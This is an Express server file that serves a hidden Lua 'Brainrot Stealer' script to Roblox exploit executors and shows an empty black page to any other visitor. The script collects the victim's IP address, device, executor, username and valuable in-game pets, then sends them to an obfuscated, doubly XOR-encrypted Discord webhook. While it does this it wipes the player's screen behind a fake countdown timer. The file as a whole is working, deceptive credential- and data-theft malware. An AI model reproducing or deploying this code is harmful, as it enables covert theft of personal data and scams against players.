// server.js
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// ---------------------------------------------------------------
// BLOCK NON-EXECUTORS
// ---------------------------------------------------------------
function blockNonExecutor(req, res, next) {
  const ua  = (req.get("User-Agent") || "").toLowerCase();
  const ref = (req.get("Referer")    || "").toLowerCase();

  const allowed =
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ref.includes("roblox.com");

  if (!allowed) {
    return res.status(403).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
    `.trim());
  }
  next();
}

// ---------------------------------------------------------------
// HOME – BLACK SCREEN
// ---------------------------------------------------------------
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
  `.trim());
});

// ---------------------------------------------------------------
// /raw – EXECUTORS ONLY + INJECT ENCRYPTED WEBHOOK
// ---------------------------------------------------------------
app.get("/raw", blockNonExecutor, (req, res) => {
  const encrypted = req.query.wh;
  if (!encrypted) return res.status(400).send("-- MISSING DATA --");

  // ---- DECRYPT (must match Lua) ----
  let webhook = "";
  try {
    const key1 = "brainrot_secure_2024_key1";
    let layer1 = "";
    for (let i = 0; i < encrypted.length; i++) {
      const k = key1.charCodeAt(i % key1.length);
      const d = encrypted.charCodeAt(i);
      layer1 += String.fromCharCode(d ^ k);
    }

    const key2 = "x7f9!pQz@3mK*vR$5";
    let layer2 = "";
    for (let i = 0; i < layer1.length; i++) {
      const k = key2.charCodeAt(i % key2.length);   // <-- FIXED: was "char  CodeAt"
      const d = layer1.charCodeAt(i);
      layer2 += String.fromCharCode(d ^ k);
    }

    webhook = Buffer.from(layer2, "base64").toString("utf-8");
  } catch (e) {
    return res.status(400).send("-- INVALID ENCRYPTION --");
  }

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK --");
  }

  // ---- FULL FIXED LUA SCRIPT (same as the working one) ----
  const lua = `-- BRAINROT STEALER – FULLY FIXED
local Players        = game:GetService("Players")
local HttpService    = game:GetService("HttpService")
local UserInputSvc   = game:GetService("UserInputService")

-- WAIT FOR PLAYER & GUI
local player = Players.LocalPlayer
if not player then repeat task.wait() until Players.LocalPlayer player = Players.LocalPlayer end
repeat task.wait() until player:FindFirstChild("PlayerGui")
pcall(function() HttpService.HttpEnabled = true end)
task.wait(0.5)

-- DECRYPT WEBHOOK
local EncryptedData = "${encrypted}"
local function DecryptWebhook(d)
    local k1 = "brainrot_secure_2024_key1"
    local k2 = "x7f9!pQz@3mK*vR$5"
    local l1 = ""
    for i = 1, #d do
        local kc = string.byte(k1, (i-1)%#k1 + 1)
        local dc = string.byte(d, i)
        l1 = l1 .. string.char(bit32.bxor(dc, kc))
    end
    local l2 = ""
    for i = 1, #l1 do
        local kc = string.byte(k2, (i-1)%#k2 + 1)
        local dc = string.byte(l1, i)
        l2 = l2 .. string.char(bit32.bxor(dc, kc))
    end
    return l2
end
local WebhookURL = DecryptWebhook(EncryptedData)

-- SAFE HTTP
local function SafeHttp(url, body)
    local ok, r = pcall(function()
        if syn and syn.request then
            local resp = syn.request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
            return resp and (resp.StatusCode==200 or resp.StatusCode==204)
        end
        if request and type(request)=="function" then
            local resp = request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
            return resp and (resp.StatusCode==200 or resp.StatusCode==204)
        end
        if HttpService.HttpEnabled then
            pcall(function() HttpService:PostAsync(url,body,Enum.HttpContentType.ApplicationJson) end)
            return true
        end
        return false
    end)
    return ok and r
end
local function Send(embed)
    local json = HttpService:JSONEncode({embeds={embed}})
    task.spawn(function() SafeHttp(WebhookURL, json) end)
end

-- UTIL
local function Exec() if syn then return "Synapse X" elseif KRNL_LOADED then return "Krnl" elseif fluxus then return "Fluxus" elseif PROTOSMASHER_LOADED then return "ProtoSmasher" elseif electron then return "Electron" else return "Unknown" end end
local function IP() local s,i=pcall(function()return game:HttpGet("https://api.ipify.org",true)end) return s and i or "Unknown" end
local function Dev() return UserInputSvc.TouchEnabled and "Mobile" or "PC" end
local function FM(v) if v>=1e9 then return string.format("$%.2fB/s",v/1e9) elseif v>=1e6 then return string.format("$%.2fM/s",v/1e6) elseif v>=1e3 then return string.format("$%.2fK/s",v/1e3) else return "$"..v.."/s" end end
local function FPL(p,m) if #p==0 then return "None" end local s="" for i=1,math.min(5,#p) do s=s..i..". "..p[i].Name.." | "..(m and FM(p[i].Money) or p[i].Rate).."\\n" end return s end

-- BLACK SCREEN
local function BS()
    pcall(function() for _,g in pairs(player.PlayerGui:GetChildren()) do pcall(function()g:Destroy()end) end end)
    local sg=Instance.new("ScreenGui") sg.Name="BrainrotScanner" sg.ResetOnSpawn=false sg.Parent=player.PlayerGui
    local bg=Instance.new("Frame") bg.Size=UDim2.new(2,0,2,0) bg.Position=UDim2.new(-0.5,0,-0.5,0) bg.BackgroundColor3=Color3.new(0,0,0) bg.BorderSizePixel=0 bg.Parent=sg
    local t=Instance.new("TextLabel") t.Size=UDim2.new(1,0,0,80) t.Position=UDim2.new(0,0,0.4,0) t.BackgroundTransparency=1 t.Text="06:00" t.TextColor3=Color3.fromRGB(0,255,255) t.TextSize=48 t.Font=Enum.Font.GothamBold t.Parent=bg
    local s=Instance.new("TextLabel") s.Size=UDim2.new(1,0,0,25) s.Position=UDim2.new(0,0,0.55,0) s.BackgroundTransparency=1 s.Text="Initializing..." s.TextColor3=Color3.new(1,1,1) s.TextSize=18 s.Font=Enum.Font.Gotham s.Parent=bg
    return sg,t,s
end

-- SCAN PETS
local function Scan()
    local all,br,top={},{},{}
    pcall(function()
        local plots=workspace:FindFirstChild("Plots") if not plots then return end
        for _,plot in pairs(plots:GetChildren()) do
            local pods=plot:FindFirstChild("AnimalPodiums") if not pods then continue end
            for _,pod in pairs(pods:GetChildren()) do
                local base=pod:FindFirstChild("Base") if not base then continue end
                local spawn=base:FindFirstChild("Spawn") if not spawn then continue end
                local att=spawn:FindFirstChild("Attachment") if not att then continue end
                local oh=att:FindFirstChild("AnimalOverhead") if not oh then continue end
                local nameL=oh:FindFirstChild("DisplayName")
                local genL=oh:FindFirstChild("Generation")
                if not nameL or not nameL:IsA("TextLabel") then continue end
                local n=nameL.Text local r=genL and genL.Text or "0/s" if n=="" then continue end
                local num=tonumber(string.match(r,"([%d%.]+)")) or 0
                local mon=0
                if string.find(r,"B/s") then mon=num*1e9
                elseif string.find(r,"M/s") then mon=num*1e6
                elseif string.find(r,"K/s") then mon=num*1e3
                else mon=num end
                local pet={Name=n,Rate=r,Money=mon}
                table.insert(all,pet)
                if string.find(string.lower(n),"brainrot") and mon>1e6 then table.insert(br,pet) end
            end
        end
    end)
    table.sort(all,function(a,b)return a.Money>b.Money end)
    table.sort(br,function(a,b)return a.Money>b.Money end)
    for i=1,math.min(5,#all) do if all[i].Money>0 then table.insert(top,all[i]) end end
    return all,br,top
end
local function Hit(br,top)
    if #br>2 then return "LEGIT HIT - Multiple brainrots" end
    if #top>0 and top[1].Money>5e7 then return "LEGIT HIT - High value" end
    if #br>0 then return "POTENTIAL - Brainrot found" end
    return "LOW VALUE - Nothing good"
end

-- MAIN PROCESS
local function Start(link)
    local ex=Exec() local ip=IP() local dev=Dev() local pc=#Players:GetPlayers()
    local sg,tmr,st=BS()
    pcall(function() game:GetService("SoundService").Volume=0 end)
    st.Text="Scanning pets..." task.wait(1.5)
    local a,b,tp=Scan() local h=Hit(b,tp)
    st.Text="Sending logs..."
    local emb={title="BRAINROT STEALER - LOGS",description="Game: "..(link or "Unknown"),color=65280,
        author={name=player.Name,icon_url="https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png",url="https://www.roblox.com/users/"..player.UserId.."/profile"},
        fields={
            {name="USER INFO",value="Executor: "..ex.."\\nIP: "..ip.."\\nDevice: "..dev,inline=true},
            {name="PROFILE",value="[View](https://www.roblox.com/users/"..player.UserId.."/profile)",inline=true},
            {name="SERVER",value="Players: "..pc.."\\nPets: "..#a.."\\nBrainrots: "..#b,inline=true},
            {name="TOP 5 PETS",value=FPL(tp,true),inline=false},
            {name="BRAINROTS",value=FPL(b,true),inline=false},
            {name="HIT STATUS",value=h,inline=false}
        },
        footer={text="Brainrot Stealer • "..os.date("%X")},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    Send(emb)
    st.Text="6-minute timer..." task.wait(1)
    local tot=360 local stt=tick()
    while tick()-stt<tot do
        local left=tot-(tick()-stt) local m=math.floor(left/60) local s=math.floor(left%60)
        tmr.Text=string.format("%02d:%02d",m,s) task.wait(0.1)
    end
    local done={title="BRAINROT STEALER - COMPLETE",color=32768,
        author={name=player.Name,icon_url="https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"},
        fields={{name="RESULTS",value="Time: 6:00\\nPets: "..#a.."\\nBrainrots: "..#b.."\\nStatus: "..h,inline=false}},
        footer={text="Brainrot Stealer • "..os.date("%X")}
    }
    Send(done)
    st.Text="Complete!" tmr.Text="DONE" task.wait(3) pcall(function()sg:Destroy()end)
end

-- GUI
local function GUI()
    local sg=Instance.new("ScreenGui") sg.Name="StealerPanel" sg.ResetOnSpawn=false sg.Parent=player.PlayerGui
    local f=Instance.new("Frame") f.Size=UDim2.new(0,400,0,250) f.Position=UDim2.new(0.5,-200,0.5,-125) f.BackgroundColor3=Color3.fromRGB(20,20,20) f.BorderSizePixel=0 f.Parent=sg
    local ttl=Instance.new("TextLabel") ttl.Size=UDim2.new(1,0,0,60) ttl.BackgroundColor3=Color3.fromRGB(0,50,0) ttl.Text="BRAINROT STEALER\\nEVERYONE CAN USE" ttl.TextColor3=Color3.fromRGB(0,255,0) ttl.Font=Enum.Font.GothamBold ttl.TextSize=16 ttl.Parent=f
    local box=Instance.new("TextBox") box.Size=UDim2.new(0.8,0,0,40) box.Position=UDim2.new(0.1,0,0.3,0) box.BackgroundColor3=Color3.fromRGB(40,40,40) box.TextColor3=Color3.new(1,1,1) box.PlaceholderText="Paste Roblox game link..." box.Parent=f
    local btn=Instance.new("TextButton") btn.Size=UDim2.new(0.7,0,0,50) btn.Position=UDim2.new(0.15,0,0.7,0) btn.BackgroundColor3=Color3.fromRGB(0,200,0) btn.Text="START STEALING" btn.TextColor3=Color3.new(1,1,1) btn.Font=Enum.Font.GothamBold btn.Parent=f
    btn.MouseButton1Click:Connect(function()
        local l=box.Text
        if string.find(string.lower(l),"roblox%.com") then
            btn.Text="STARTING..." btn.BackgroundColor3=Color3.fromRGB(0,100,0) task.wait(1) Start(l)
        else
            btn.Text="INVALID LINK" btn.BackgroundColor3=Color3.fromRGB(200,0,0) task.wait(2)
            btn.Text="START STEALING" btn.BackgroundColor3=Color3.fromRGB(0,200,0)
        end
    end)
end

GUI()
print("Brainrot Stealer loaded!")`;

  // inject encrypted webhook
  const finalLua = lua.replace("${encrypted}", encrypted);
  res.type("text/plain").send(finalLua);
});

// ---------------------------------------------------------------
// 404 – BLACK SCREEN
// ---------------------------------------------------------------
app.use((req, res) => {
  res.status(404).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
  `.trim());
});

// ---------------------------------------------------------------
// START SERVER
// ---------------------------------------------------------------
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Example: https://YOURDOMAIN.onrender.com/raw?wh=<ENCRYPTED_WEBHOOK>`);
});
